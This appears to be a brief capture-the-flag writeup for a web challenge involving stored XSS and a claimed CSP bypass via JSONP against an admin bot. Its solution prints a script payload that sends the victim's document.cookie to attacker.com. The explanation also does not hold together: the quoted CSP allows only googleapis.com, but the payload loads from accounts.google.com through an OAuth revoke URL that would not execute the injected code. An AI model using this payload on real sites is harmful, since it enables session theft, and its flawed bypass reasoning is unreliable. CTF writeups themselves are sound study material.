---
layout: page
title: "NOTENINJA - Google CTF 2025 Writeup"
subtitle: "Stored XSS in a note-sharing app with CSP bypass via JSONP endpoint. Admin bot visits shared notes — steal admin cookie via a JSONP callback to an actor-controlled server."
permalink: /ctf/writeups/challenges/web/noteninja/
category: "web"
challenge_name: "NOTENINJA"
difficulty: "Medium"
event: "Google CTF 2025"
points: "238"
solves: "67"
date: 2026-06-26
---

## 🚩 Challenge Overview
* **Platform/Event**: Google CTF 2025
* **Difficulty**: Medium
* **Points**: 238
* **Solves**: 67
* **Category**: Web
* **Tags**: Stored XSS, CSP Bypass, JSONP, Cookie Theft

---

## 📝 Description
Stored XSS in a note-sharing app with CSP bypass via JSONP endpoint. Admin bot visits shared notes — steal admin cookie via a JSONP callback to an actor-controlled server.

---

## 💡 Solution / Approach
1. Note content is reflected into the DOM without sanitization.

2. CSP: `script-src 'self' *.googleapis.com` — JSONP via googleapis.com allowed.

3. Payload: `<script src="https://accounts.google.com/o/oauth2/revoke?token=fetch('https://attacker.com/?c='+document.cookie)"></script>`

4. Submit note URL to admin bot → receive admin session cookie.
